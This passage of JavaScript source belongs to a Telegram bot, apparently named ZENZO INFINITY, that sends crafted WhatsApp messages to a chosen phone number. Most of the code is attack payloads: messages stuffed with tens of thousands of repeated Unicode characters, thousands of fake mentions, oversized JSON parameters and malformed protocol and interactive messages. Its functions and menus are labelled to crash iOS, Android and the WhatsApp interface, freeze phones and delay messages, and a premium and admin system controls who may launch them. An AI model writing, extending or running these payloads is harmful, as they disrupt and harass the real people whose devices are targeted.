          jpegThumbnail: "/9j/2wBDAA4KCw0LCQ4NDA0QDw4RFiQXFhQUFiwgIRokNC43NjMuMjI6QVNGOj1OPjIySGJJTlZYXV5dOEVmbWVabFNbXVn/2wBDAQ8QEBYTFioXFypZOzI7WVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVn/wAARCAAyADIDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAIBAwQFBv/EAC0QAAEEAQIEBAUFAAAAAAAAAAEAAgMRIRIxBBNBUSJCYXEFMoGRoVJygrHB/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAIBEAAgIBBAMBAAAAAAAAAAAAAAECEQMSFCExBEJRcf/aAAwDAQACEQMRAD8A8wTcunsLUAM1GSvFVEpRQe5w6uKgvZr9ewFqj2HJdsduq8E0jSL3NpmkV1+uEryKskho3ANEoG2oxszcRzIn6g8mN3R3QpmvOMYTzu4d8YbFE9khq62/KVjNIx9QUjkTcpWh9Y7vQl0j9P5Qmb3IcHSHWQBqOT7rXzYoOG5cVFxHkI372sZ0yNJc0OF5BQaZG54Apouh1SJlHV+DAuymr1WeGZjGiTiJq1Cwxv8ASXjfiYjdo4LSGkXzNz7Z2RZnuIJGyWMxQOmfTQ0YDjVqgPD2se0+F4XJaeJ4kPAMknmcLv6rrMjLIIo7FgZQGPI8jfBFH0Qp5Z6oQaaX8KRKWEO8Tw7sNloBFenUKtlcpo+XFYOUzBihZI3JQKFowT8AbLoCHA+UnIWjhPh8HKcOKcQ+xWjelp2BLmivumFDYUihbeDdjRiOGIsgiEYO5uyR6lI7S7PQdVAIeTd1dUhwJdQ7YCZqklGorgiu2qv3IVYlcQL1WhIjXEp4UkxCzeSt/lQhAeP0VdAmAouAxhCEyl2QN2eyiTf+J/xCEC9Wc4udZ8R+6EIUnGf/2Q==",
          caption: "ꦾ".repeat(60000),
          inviteExpiration: Date.now() + 9999999999,
          inviteCode: Date.now(),
          inviteLink: `https://chat.whatsapp.com/${"\x10".repeat(5000)}${"ꦾ".repeat(5000)}`, 
          followerCount: 999999,
          creationTime: Date.now() - 1000000,
          adminJid: target,
          isInviteOnly: false,
          isPinned: true,
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: target,
            stanzaId: Date.now(),
            mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`),
            forwardingScore: 9741,
            isForwarded: true,
            externalAdReply: {
               quotedAd: {
                advertiserName: "\x10".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: "Rixzz" + "\x10".repeat(60000)
              },
             placeholderKey: {
                remoteJid: "0s.whatsapp.net", 
                fromMe: false, 
                id: Date.now() 
              }
            },
            quotedMessage: {
              paymentInviteMessage: { 
                 serviceType: 3, 
                 expiryTimestamp: Date.now() + 1814400000 
               }
            }
          }
        }
      }},
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    }, {});
    await sock.relayMessage(target, msg.message, { 
        messageId: msg.key.id,
        userJid: target,
        participant: { jid: target } 
       });
  } catch (e) {
    console.log("error:\n" + e);
  }
}

async function DelayTagSw(sock, target) {
  let mentionList = Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`);
  let aksara = "ꦀ".repeat(3000) + "\n" + "ꦂ‎".repeat(3000);
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  if (11 > 9) {
    parse = parse ? false : true;
  }
  
      const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".Rxz" + "ោ៝".repeat(10000),
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  
      let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - who are you ? ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );    
    
    let message = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  }, {});
    const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "XrL-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: mentionList,
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "1",
            durationSecs: "0",
            callType: "REGULAR",
            participants: [{
              jid: "5521992999999@s.whatsapp.net",
              callOutcome: "1"
            }]
          },
          viewOnceMessage: {
            message: {
              stickerMessage: {
                url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                mimetype: type,
                directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                fileLength: {
                  low: Math.floor(Math.random() * 200000000),
                  high: 0,
                  unsigned: true
                },
                mediaKeyTimestamp: {
                  low: Math.floor(Math.random() * 1700000000),
                  high: 0,
                  unsigned: false
                },
                firstFrameLength: 19904,
                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                isAnimated: true,
                stickerSentTs: {
                  low: Math.floor(Math.random() * -20000000),
                  high: 555,
                  unsigned: parse
                },
                isAvatar: parse,
                isAiSticker: parse,
                isLottie: parse
              }
            }
          },
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: `</> Rixzz Is Back!!! - ${aksara}`,
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
            scanLengths: [2437, 17332],
            contextInfo: {
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        },
        annotations: [
          {
            embeddedContent: {
              X 
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});
  
  await sock.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  
    await sock.relayMessage("status@broadcast", message.message, {
    messageId: message.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  
    await sock.relayMessage("status@broadcast", biji2.message, {
    messageId: biji2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });  
}

async function uiAndro(sock, target) {
  sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363393482719988@newsletter",
                newsletterName: ` ⺞ `,
                serverMessageId: 1,
              },
              remoteJid: "status@broadcast",
              participant: "0@s.whatsapp.net",
            },
            body: {
              text: `* Zenzo { Conquest } * ${"ꦾꦾ".repeat(8800)}`,
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonsParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonsParamsJson: " [] ",
                },
              ],
            },
          },
        },
      },
    }, {});
  }

async function crashIosSpammer(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤⃟⃰ᰧ./𝗿𝘅𝘇.𝛆𝛘𝛆 ✩ > https://Wa.me/stickerpack/AllTheFeels",
        matchedText: "https://Wa.me/stickerpack/xrelly",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "‼️⃟ ‌‌./𝗿𝘅𝘇.𝛆𝛘𝛆 ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function VinzaIsX7Valid(sock, target) { 
  const buttonFrezE = Array.from({ length: 1900 }, (_, r) => ({
    title: "ោ៝".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "sayonara...",
          listType: 2,
          buttonText: "Click",
          sections: buttonFrezE,
          singleSelectReply: { selectedRowId: "🩴" },
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "VinzaIsX7"
            }
          },
          description: "x7"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  try {
    const msg = generateWAMessageFromContent(target, MSG, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {}
}

async function VinzaButtonSpam(sock, target) { 
  const MSG = {
    viewOnceMessage: {
      message: {
        buttonsResponseMessage: {
          selectedButtonId: "BTN_1",
          contextInfo: {
            mentionedJid: [target],
            participant: target,
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  };

  try {
    const msg = generateWAMessageFromContent(target, MSG, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {}
}

async function VinzaListX(sock, target) {
  const sections = Array.from({ length: 1900 }, (_, r) => ({
    title: "᭡꧈".repeat(2000),
    rows: [{ title: `Row ${r + 1}`, id: `ID_${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "ោ៝".repeat(4000),
          listType: 2,
          buttonText: "\u0000",
          sections,
          singleSelectReply: { selectedRowId: "👒" },
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
              )
            ],
            participant: target,
            remoteJid: "status@broadcast"
          },
          description: "U-Kwon"
        }
      }
    }
  };

  try {
    const msg = generateWAMessageFromContent(target, MSG, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {}
}

async function VinzaProtocol(sock, target) {
  const MSG = {
    viewOnceMessage: {
      message: {
        protocolMessage: {
          key: { remoteJid: target, fromMe: false },
          type: 14
        }
      }
    }
  };

  try {
    const msg = generateWAMessageFromContent(target, MSG, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {}
}

async function UIMention(sock, target, mention = true) {
  const qwerty = "https://files.catbox.moe/4x4hzu.jpg"
  const msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { 
              text: "\n" + "\n" + "\u200B" + "ꦾ".repeat(10000) + "ꦽ".repeat(2500) + "ោ៝".repeat(2500)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_id: Date.now(),
                    flow_message_version: "9",
                    flow_token: Date.now(),
                    flow_action: "share",
                    flow_action_payload: {
                      screen: "GALLERY_SCREEN",
                      params: {
                        media_type: "image",
                        max_selection: 9999999
                      }
                    },
                    flow_cta: "x",
                    icon: qwerty,
                    updated_at: null,
                    experimental_flags: {
                      use_native_flow_v2: true,
                      enable_logging_context: true
                    }
                  })
                }
              ]
            },
            ...(mention ? { contextInfo: { mentionedJid: [target] } } : {})
          }
        }
      }
    }),
    {}
  );

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}
// case bug ada dibawah sendiri
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);  // Mengambil status premium langsung
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  
  if (shouldIgnoreMessage(msg)) return;

  // Tidak lagi memeriksa status premium, langsung ke video
  bot.sendVideo(chatId, "https://files.catbox.moe/0jd5m3.mp4", {
    caption: `\`\`\`
━━━【ℤ𝔼ℕℤ𝕆】━━━ ㊙
こんにちは ${username} 私はZENZO INFINITYです
楽しく使ってください、いつも祈ることを忘れないでください
開発者はハンサムだ
亗 𝑹𝑰𝑿𝒁𝒁 𝑨𝑳𝑾𝑨𝒀𝑺 𝑭𝑶𝑹 𝒀𝑶𝑼
╰┈┈┈┈┈┈┈┈⚬
✘𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒔𝒊𝒁𝒆𝒏𝒛𝒐×͜×
ッ
➥ 所有者 : @RixzzNotDev
➥ バージョン : 4.0 Vip
➥ プレミアムステータス : ${premiumStatus}  
➥ ランタイム : ${runtime}  
➥ あなたのID : ${senderId}  

ᝰ.ᐟ𝑺𝒆𝒃𝒆𝒍𝒖𝒎 𝑴𝒆𝒎𝒖𝒍𝒂𝒊 𝑴𝒊𝒏𝒕𝒂𝒍𝒂𝒉 𝒌𝒆𝒑𝒂𝒅𝒂 𝒂𝒅𝒎𝒊𝒏 𝒖𝒏𝒕𝒖𝒌 /𝒓𝒆𝒒𝒑𝒂𝒊𝒓
𝒕𝒆𝒓𝒍𝒆𝒃𝒊𝒉 𝒅𝒂𝒉𝒖𝒍𝒖 𝒂𝒈𝒂𝒓 𝒅𝒂𝒑𝒂𝒕 𝒎𝒆𝒏𝒋𝒂𝒍𝒂𝒏𝒌𝒂𝒏 𝒁𝒆𝒏𝒛𝒐⚔

×͜× ᴘᴇɴᴄᴇᴛ sᴀʟᴀʜ sᴀᴛᴜ ᴛᴏᴍʙᴏʟ ᴅɪʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴢᴇɴᴢᴏ

\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "sᴇᴛᴛɪɴɢs", callback_data: "owner_menu" },
          { text: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "settings_menu" }, 
          { text: "ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "tqto" }
        ],
        [
          { text: "ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒", callback_data: "trashmenu" }
        ]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `\`\`\`
━━━【ℤ𝔼ℕℤ𝕆】━━━

╭━( 𝘉𝘜𝘎 𝘛𝘠𝘗𝘌 )
┃ᝰ.ᐟ /ZnzDelayZ 62×× 
┃╰┈➤ ᴅᴇʟᴀʏ ᴛᴀɢ sᴡ
┃ᝰ.ᐟ /ProtoX 62×× 
┃╰┈➤ ᴠɪsʙʟᴇ ᴅᴇʟᴀʏ
┃ᝰ.ᐟ /CrashIos 62×× 
┃╰┈➤ ᴄʀᴀsʜ ɪᴏs
┃ᝰ.ᐟ /CrashUi 62×× 
┃╰┈➤ ᴄʀᴀsʜ ᴜɪ ᴅᴇᴠɪᴄᴇ
┃ᝰ.ᐟ /ZnzFreze 62xx
┃╰┈➤ ғʀᴇᴢᴇ ᴘʜᴏɴᴇ
┃ᝰ.ᐟ /BlankZ 62×× 
┃╰┈➤ ʙʟᴀɴᴋ ᴄʟɪᴄᴋ
┃ᝰ.ᐟ /ZnzCrash 62××
┃╰┈➤ ᴄʀᴀsʜ ᴡʜᴀᴛsᴀᴘᴘ
┃ᝰ.ᐟ /ZnzCombo 62×× 
┃╰┈➤ ᴍɪx-ᴘᴏᴡᴇʀ
╰━━━━━━━━━━━━━━━༉‧.
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "owner_menu") {
      caption = `\`\`\`
╭━━━【ℤ𝔼ℕℤ𝕆】━━━
┃ᝰ.ᐟ 所有者  : @RixzzNotDev
┃ᝰ.ᐟ バージョン : 4.0 Vip
┃ᝰ.ᐟ ランタイム : ${runtime}
╰━━━━━━━━━━━━━━━━━━༉‧.
ZENZO INFINITYがあなたを攻撃します
╭━( ɪɴғᴏʀᴍᴀᴛɪᴏɴ )
┃ᝰ.ᐟ ユーザー : ${username}
┃ᝰ.ᐟ ユーザーID : ${senderId}
┃ᝰ.ᐟ プレミアムステータス : ${premiumStatus}
╰━━━━━━━━━━━━━━━━━━༉‧.
╭━( 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 𝙼𝙴𝙽𝚄 )
┃ᝰ.ᐟ /sᴇᴛᴄᴅ <5ᴍ>
┃ᝰ.ᐟ /ᴀᴅᴅᴘʀᴇᴍ <ɪᴅ>
┃ᝰ.ᐟ /ᴅᴇʟᴘʀᴇᴍ <ɪᴅ>
┃ᝰ.ᐟ /ᴄᴇᴋᴘʀᴇᴍ
┃ᝰ.ᐟ /ᴀᴅᴅᴀᴅᴍɪɴ <ɪᴅ>
┃ᝰ.ᐟ /ᴀᴅᴅʙᴏᴛ 62×××
┃ᝰ.ᐟ /ᴀᴅᴅ <ᴄʀᴇᴅs.ᴊsᴏɴ>
┃ᝰ.ᐟ /ʟɪsᴛʙᴏᴛ
┃ᝰ.ᐟ /ɢᴇᴛᴄᴏᴅᴇ 
┃ᝰ.ᐟ /ᴛᴏғᴜɴᴄ <ᴛᴇᴋs/ᴠɪᴅ/ғᴏᴛᴏ>
┃ᝰ.ᐟ /ᴛʀᴀᴄᴋɪɴɢɪᴘ 8.8.8.8
┃ᝰ.ᐟ /ᴘʟᴀʏ <ᴘʟᴀʏ ᴍᴜsɪᴄ>
┃ᝰ.ᐟ /ᴛᴏᴜʀʟ <ғᴏᴛᴏ/ᴠɪᴅ>
┃ᝰ.ᐟ /ʀᴇsᴛᴀʀᴛ
┃ᝰ.ᐟ /ᴇɴᴄᴊᴀᴠᴀ
┃ᝰ.ᐟ /ᴄᴇᴋɪᴅᴄʜ <ʟɪɴᴋ>
╰━━━━━━━━━━━━━━━━━━༉‧.
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "settings_menu") {
      caption = `\`\`\`
╭━━━【ℤ𝔼ℕℤ𝕆】━━━
┃ᝰ.ᐟ 所有者  : @RixzzNotDev
┃ᝰ.ᐟ バージョン : 4.0 Vip
┃ᝰ.ᐟ ランタイム : ${runtime}
╰━━━━━━━━━━━━━━━━━━༉‧.
ZENZO INFINITYがあなたを攻撃します
╭━( ɪɴғᴏʀᴍᴀᴛɪᴏɴ )
┃ᝰ.ᐟ ユーザー : ${username}
┃ᝰ.ᐟ ユーザーID : ${senderId}
┃ᝰ.ᐟ プレミアムステータス : ${premiumStatus}
╰━━━━━━━━━━━━━━━━━━༉‧.
オタックス・ダーリング・スイング
╭━( 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 )
┃ᝰ.ᐟ /ᴀᴅᴅᴀᴅᴍɪɴ <ɪᴅ>
┃ᝰ.ᐟ /ᴅᴇʟᴀᴅᴍɪɴ <ɪᴅ>
┃ᝰ.ᐟ /ᴀᴅᴅᴘʀᴇᴍ <ɪᴅ>
┃ᝰ.ᐟ /ᴅᴇʟᴘʀᴇᴍ <ɪᴅ>
┃ᝰ.ᐟ /ᴀᴅᴅʙᴏᴛ 628xx
┃ᝰ.ᐟ /ᴀᴅᴅ <ᴄʀᴇᴅs.ᴊsᴏɴ>
┃ᝰ.ᐟ /ʟɪsᴛʙᴏᴛ
┃ᝰ.ᐟ /ᴛᴏғᴜɴᴄ <ᴛᴇᴋs/ᴠɪᴅ/ғᴏᴛᴏ>
╰━━━━━━━━━━━━━━━━━━༉‧.
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "tqto") {
      caption = `\`\`\`
╭━━━【ℤ𝔼ℕℤ𝕆】━━━
┃ᝰ.ᐟ 所有者  : @RixzzNotDev
┃ᝰ.ᐟ バージョン : 4.0 Vip
┃ᝰ.ᐟ ランタイム : ${runtime}
╰━━━━━━━━━━━━━━━━━━༉‧.
ZENZO INFINITYがあなたを攻撃します
╭━( ɪɴғᴏʀᴍᴀᴛɪᴏɴ )
┃ᝰ.ᐟ ユーザー : ${username}
┃ᝰ.ᐟ ユーザーID : ${senderId}
┃ᝰ.ᐟ プレミアムステータス : ${premiumStatus}
╰━━━━━━━━━━━━━━━━━━༉‧.
オタックス・ダーリング・スイング
╭━( 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 )
┃ᝰ.ᐟ ʀɪxᴢᴢ [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
┃ᝰ.ᐟ ᴅʀᴀxᴢ [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ʀɪᴢᴢx [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ʀᴇɴᴢᴢᴇ [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ғᴏʀxᴢᴢ [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ʀɪᴋᴢᴢ [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ sᴀᴛᴜʀɴ [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ᴅᴇᴀᴛʜ ᴋɪɴɢs [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ᴏᴛᴀ [ ᴅᴇᴠ ᴏᴛᴀx ]
┃ᝰ.ᐟ ᴅɪᴍᴢᴢxᴢ [ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ᴢᴇɴᴛʀɪx [ ғʀɪᴇɴᴅ ]
┃ᝰ.ᐟ ᴅᴇᴡᴅᴇᴠ [ ғʀɪᴇɴᴅ ]
┃ᝰ.ᐟ ᴀʙɪᴍ [ ғʀɪᴇɴᴅ ]
┃ᝰ.ᐟ ᴋɪʟʟᴇʀ ᴛᴢʏ [ ғʀɪᴇɴᴅ ]
┃ᝰ.ᐟ ᴅᴇᴘᴀʏ [ sᴜᴘᴘᴏʀᴛ x ᴘᴛ ]
┃ᝰ.ᐟ ɴᴛᴇᴅ [ sᴜᴘᴘᴏʀᴛ x ᴘᴛ ]
┃ᝰ.ᐟ ɪᴄʜᴀ [ sᴜᴘᴘᴏʀᴛ x ᴘᴛ ]
┃ᝰ.ᐟ ᴊᴀʏᴢ [ ғʀɪᴇɴᴅ ]
┃ᝰ.ᐟ ᴀʟʟᴀʜ [ ᴍʏ ɢᴏᴅ ]
┃ᝰ.ᐟ ᴏʀᴛᴜ [ ʙᴇsᴛ sᴜᴘᴘᴏʀᴛ ]
┃ᝰ.ᐟ ᴀʟʟ ᴘᴀʀᴛɴᴇʀ ʀɪxᴢᴢ
┃ᝰ.ᐟ ᴀʟʟ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ ʀɪxᴢᴢ
┃ᝰ.ᐟ ᴀʟʟ ᴍᴇᴍʙᴇʀ sᴄʀɪᴘᴛ
┃ᝰ.ᐟ ᴀʟʟ ʙᴜʏᴇʀ sᴄʀɪᴘᴛ
╰━━━━━━━━━━━━━━━━━━━༉‧.
╭━━━【ℤ𝔼ℕℤ𝕆】━━━
┃ᝰ.ᐟ 所有者  : @RixzzNotDev
┃ᝰ.ᐟ バージョン : 4.0 Vip
┃ᝰ.ᐟ ランタイム : ${runtime}
╰━━━━━━━━━━━━━━━━━━༉‧.
ZENZO INFINITYがあなたを攻撃します
╭━( ɪɴғᴏʀᴍᴀᴛɪᴏɴ )
┃ᝰ.ᐟ ユーザー : ${username}
┃ᝰ.ᐟ ユーザーID : ${senderId}
┃ᝰ.ᐟ プレミアムステータス : ${premiumStatus}
╰━━━━━━━━━━━━━━━━━━༉‧.
オタックス・ダーリング・スイング
╭━( 𝙱𝚊𝚌𝚔 𝚃𝚘 𝙼𝚊𝚒𝚗 𝙼𝚎𝚗𝚞 )
┃ Please Press the Button Below 
╰━━━━━━━━━━━━━━━━━━━༉‧.
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
        [{ text: "sᴇᴛᴛɪɴɢs ᴍᴇɴᴜ", callback_data: "owner_menu" }, { text: "ᴏwɴᴇʀ ᴍᴇɴᴜ", callback_data: "settings_menu" },
        { text: "ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "tqto" }],
        [{ text: "ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒", callback_data: "trashmenu" }]
      ]
